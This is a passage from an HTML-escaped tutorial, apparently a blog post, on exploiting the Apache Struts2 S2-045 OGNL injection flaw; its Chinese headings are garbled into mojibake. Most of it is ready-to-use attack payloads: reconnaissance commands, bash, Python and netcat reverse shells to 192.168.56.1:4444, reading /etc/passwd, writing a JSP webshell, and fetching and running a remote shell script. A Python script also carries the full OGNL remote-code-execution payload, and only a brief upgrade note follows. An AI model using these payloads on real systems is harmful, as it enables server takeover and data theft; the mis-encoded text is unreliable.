&lt;td&gt;å°†å‘½ä»¤è¾“å‡ºå†™å…¥HTTPå“åº”&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;&lt;/table&gt;
&lt;h3 id=&#34;æ”»å‡»æ•ˆæœæ¼”ç¤º&#34;&gt;&lt;a href=&#34;#æ”»å‡»æ•ˆæœæ¼”ç¤º&#34; class=&#34;headerlink&#34; title=&#34;æ”»å‡»æ•ˆæœæ¼”ç¤º&#34;&gt;&lt;/a&gt;æ”»å‡»æ•ˆæœæ¼”ç¤º&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;è¯·æ±‚å‘é€åçš„å“åº”&lt;/strong&gt;:&lt;/p&gt;
&lt;figure class=&#34;highlight http&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs http&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;HTTP/1.1&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;200&lt;/span&gt; OK&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Server&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;Apache-Coyote/1.1&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content-Type&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;text/html;charset=UTF-8&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Content-Length&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;9&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Date&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;Wed, 24 Jul 2025 08:30:45 GMT&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Connection&lt;/span&gt;&lt;span class=&#34;hljs-punctuation&#34;&gt;: &lt;/span&gt;close&lt;br&gt;&lt;br&gt;&lt;span class=&#34;language-haskell&#34;&gt;&lt;span class=&#34;hljs-title&#34;&gt;www&lt;/span&gt;-&lt;span class=&#34;hljs-class&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;data&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;é«˜çº§åˆ©ç”¨æŠ€å·§&#34;&gt;&lt;a href=&#34;#é«˜çº§åˆ©ç”¨æŠ€å·§&#34; class=&#34;headerlink&#34; title=&#34;é«˜çº§åˆ©ç”¨æŠ€å·§&#34;&gt;&lt;/a&gt;é«˜çº§åˆ©ç”¨æŠ€å·§&lt;/h2&gt;&lt;h3 id=&#34;1-ä¿¡æ¯æ”¶é›†å‘½ä»¤&#34;&gt;&lt;a href=&#34;#1-ä¿¡æ¯æ”¶é›†å‘½ä»¤&#34; class=&#34;headerlink&#34; title=&#34;1. ä¿¡æ¯æ”¶é›†å‘½ä»¤&#34;&gt;&lt;/a&gt;1. ä¿¡æ¯æ”¶é›†å‘½ä»¤&lt;/h3&gt;&lt;figure class=&#34;highlight autoit&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs autoit&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# ç³»ç»Ÿä¿¡æ¯&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;uname -a&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# å½“å‰ç”¨æˆ·&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;id&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# ç½‘ç»œé…ç½®&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ifconfig&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# è¿›ç¨‹åˆ—è¡¨&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ps aux&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# æ–‡ä»¶ç³»ç»Ÿ&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#cmd=&lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;ls -la /&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;2-åå¼¹Shell&#34;&gt;&lt;a href=&#34;#2-åå¼¹Shell&#34; class=&#34;headerlink&#34; title=&#34;2. åå¼¹Shell&#34;&gt;&lt;/a&gt;2. åå¼¹Shell&lt;/h3&gt;&lt;figure class=&#34;highlight hsp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs hsp&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# Bashåå¼¹Shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;bash -i &amp;gt;&amp;amp; /dev/tcp/&lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.56&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.1&lt;/span&gt;/&lt;span class=&#34;hljs-number&#34;&gt;4444&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;&amp;gt;&amp;amp;&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# Pythonåå¼¹Shell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;python -c &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&amp;quot;192.168.56.1\&amp;quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([\&amp;quot;/bin/sh\&amp;quot;,\&amp;quot;-i\&amp;quot;]);&amp;quot;&lt;/span&gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# NCåå¼¹Shell  &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;nc -e /bin/sh &lt;span class=&#34;hljs-number&#34;&gt;192.168&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.56&lt;/span&gt;&lt;span class=&#34;hljs-number&#34;&gt;.1&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;4444&lt;/span&gt;&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;3-æ–‡ä»¶æ“ä½œ&#34;&gt;&lt;a href=&#34;#3-æ–‡ä»¶æ“ä½œ&#34; class=&#34;headerlink&#34; title=&#34;3. æ–‡ä»¶æ“ä½œ&#34;&gt;&lt;/a&gt;3. æ–‡ä»¶æ“ä½œ&lt;/h3&gt;&lt;figure class=&#34;highlight hsp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs hsp&#34;&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# è¯»å–æ•æ„Ÿæ–‡ä»¶&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;cat /etc/passwd&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# å†™å…¥WebShell&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;echo &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;lt;%@ page import=\&amp;quot;java.io.*\&amp;quot; %&amp;gt;&amp;lt;% String cmd = request.getParameter(\&amp;quot;cmd\&amp;quot;); Process p = Runtime.getRuntime().exec(cmd); %&amp;gt;&amp;quot;&lt;/span&gt; &amp;gt; /tmp/shell.jsp&amp;#x27;&lt;/span&gt;&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;# ä¸‹è½½æ–‡ä»¶&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-meta&#34;&gt;#&lt;span class=&#34;hljs-keyword&#34;&gt;cmd&lt;/span&gt;=&amp;#x27;wget http:&lt;span class=&#34;hljs-comment&#34;&gt;//192.168.56.1:8000/shell.sh -O /tmp/shell.sh &amp;amp;&amp;amp; chmod +x /tmp/shell.sh &amp;amp;&amp;amp; /tmp/shell.sh&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h2 id=&#34;æ£€æµ‹ä¸é˜²æŠ¤&#34;&gt;&lt;a href=&#34;#æ£€æµ‹ä¸é˜²æŠ¤&#34; class=&#34;headerlink&#34; title=&#34;æ£€æµ‹ä¸é˜²æŠ¤&#34;&gt;&lt;/a&gt;æ£€æµ‹ä¸é˜²æŠ¤&lt;/h2&gt;&lt;h3 id=&#34;æ¼æ´æ£€æµ‹è„šæœ¬&#34;&gt;&lt;a href=&#34;#æ¼æ´æ£€æµ‹è„šæœ¬&#34; class=&#34;headerlink&#34; title=&#34;æ¼æ´æ£€æµ‹è„šæœ¬&#34;&gt;&lt;/a&gt;æ¼æ´æ£€æµ‹è„šæœ¬&lt;/h3&gt;&lt;figure class=&#34;highlight livescript&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs livescript&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;#!/usr/bin/env python3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; requests&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;import&lt;/span&gt; sys&lt;br&gt;&lt;br&gt;def check_s2_045(url):&lt;br&gt;    payload = &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;%&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#nike&lt;/span&gt;=&amp;#x27;multipart/form-data&amp;#x27;).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#dm&lt;/span&gt;=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#_memberAccess&lt;/span&gt;?(&lt;span class=&#34;hljs-subst&#34;&gt;#_memberAccess&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#dm&lt;/span&gt;):(&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#container&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#context&lt;/span&gt;[&amp;#x27;com.opensymphony.xwork2.ActionContext.container&amp;#x27;]).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#ognlUtil&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#container&lt;/span&gt;.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedPackageNames().clear()).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#ognlUtil&lt;/span&gt;.getExcludedClasses().clear()).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;            (&lt;span class=&#34;hljs-subst&#34;&gt;#context&lt;/span&gt;.setMemberAccess(&lt;span class=&#34;hljs-subst&#34;&gt;#dm&lt;/span&gt;))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        )).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#cmd&lt;/span&gt;=&amp;#x27;echo &amp;quot;S2045_VULN_TEST&amp;quot;&amp;#x27;).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#iswin&lt;/span&gt;=(@java.lang.System@getProperty(&amp;#x27;os.name&amp;#x27;).toLowerCase().contains(&amp;#x27;win&amp;#x27;))).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#cmds&lt;/span&gt;=(&lt;span class=&#34;hljs-subst&#34;&gt;#iswin&lt;/span&gt;?&amp;#123;&amp;#x27;cmd.exe&amp;#x27;,&amp;#x27;/c&amp;#x27;,&lt;span class=&#34;hljs-subst&#34;&gt;#cmd&lt;/span&gt;&amp;#125;:&amp;#123;&amp;#x27;/bin/bash&amp;#x27;,&amp;#x27;-c&amp;#x27;,&lt;span class=&#34;hljs-subst&#34;&gt;#cmd&lt;/span&gt;&amp;#125;)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#p&lt;/span&gt;=new java.lang.ProcessBuilder(&lt;span class=&#34;hljs-subst&#34;&gt;#cmds&lt;/span&gt;)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#p&lt;/span&gt;.redirectErrorStream(true)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#process&lt;/span&gt;=&lt;span class=&#34;hljs-subst&#34;&gt;#p&lt;/span&gt;.start()).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#ros&lt;/span&gt;=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (@org.apache.commons.io.IOUtils@copy(&lt;span class=&#34;hljs-subst&#34;&gt;#process&lt;/span&gt;.getInputStream(),&lt;span class=&#34;hljs-subst&#34;&gt;#ros&lt;/span&gt;)).&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;        (&lt;span class=&#34;hljs-subst&#34;&gt;#ros&lt;/span&gt;.flush())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-string&#34;&gt;    &amp;#125;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;br&gt;    &lt;br&gt;    headers = &amp;#123;&lt;br&gt;        &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Content-Type&amp;#x27;&lt;/span&gt;: payload,&lt;br&gt;        &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;User-Agent&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;hljs-string&#34;&gt;&amp;#x27;Mozilla/5.0 (compatible; S2-045-Scanner)&amp;#x27;&lt;/span&gt;&lt;br&gt;    &amp;#125;&lt;br&gt;    &lt;br&gt;    try:&lt;br&gt;        response = requests.get(url, headers=headers, timeout=&lt;span class=&#34;hljs-number&#34;&gt;10&lt;/span&gt;)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;S2045_VULN_TEST&amp;quot;&lt;/span&gt; &lt;span class=&#34;hljs-keyword&#34;&gt;in&lt;/span&gt; response.text:&lt;br&gt;            &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(f&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] &amp;#123;url&amp;#125; is vulnerable to S2-045!&amp;quot;&lt;/span&gt;)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; True&lt;br&gt;        else:&lt;br&gt;            &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(f&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[-] &amp;#123;url&amp;#125; is not vulnerable to S2-045&amp;quot;&lt;/span&gt;)&lt;br&gt;            &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; False&lt;br&gt;    except Exception &lt;span class=&#34;hljs-keyword&#34;&gt;as&lt;/span&gt; e:&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(f&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[!] Error testing &amp;#123;url&amp;#125;: &amp;#123;str(e)&amp;#125;&amp;quot;&lt;/span&gt;)&lt;br&gt;        &lt;span class=&#34;hljs-keyword&#34;&gt;return&lt;/span&gt; False&lt;br&gt;&lt;br&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; __name__ == &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;__main__&amp;quot;&lt;/span&gt;:&lt;br&gt;    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; len(sys.argv) != &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;:&lt;br&gt;        &lt;span class=&#34;hljs-built_in&#34;&gt;print&lt;/span&gt;(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;Usage: python3 s2-045-check.py &amp;lt;URL&amp;gt;&amp;quot;&lt;/span&gt;)&lt;br&gt;        sys.exit(&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;)&lt;br&gt;    &lt;br&gt;    target_url = sys.argv[&lt;span class=&#34;hljs-number&#34;&gt;1&lt;/span&gt;]&lt;br&gt;    check_s2_045(target_url)&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;h3 id=&#34;å®‰å…¨é˜²æŠ¤æªæ–½&#34;&gt;&lt;a href=&#34;#å®‰å…¨é˜²æŠ¤æªæ–½&#34; class=&#34;headerlink&#34; title=&#34;å®‰å…¨é˜²æŠ¤æªæ–½&#34;&gt;&lt;/a&gt;å®‰å…¨é˜²æŠ¤æªæ–½&lt;/h3&gt;&lt;h4 id=&#34;1-ç‰ˆæœ¬å‡çº§ï¼ˆæ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼‰&#34;&gt;&lt;a href=&#34;#1-ç‰ˆæœ¬å‡çº§ï¼ˆæ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼‰&#34; class=&#34;headerlink&#34; title=&#34;1. ç‰ˆæœ¬å‡çº§ï¼ˆæ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼‰&#34;&gt;&lt;/a&gt;1. ç‰ˆæœ¬å‡çº§ï¼ˆæ ¹æœ¬è§£å†³æ–¹æ¡ˆï¼‰&lt;/h4&gt;&lt;figure class=&#34;highlight apache&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-comment&#34;&gt;# å‡çº§åˆ°å®‰å…¨ç‰ˆæœ¬&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;Apache&lt;/span&gt; Struts &lt;span class=&#34;hljs-number&#34;&gt;2&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;.&lt;span class=&#34;hljs-number&#34;&gt;32&lt;/span&gt;+ æˆ– &lt;span class=&#34;hljs-number&#34;&gt;2.5.10.1&lt;/span&gt;+&lt;br&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

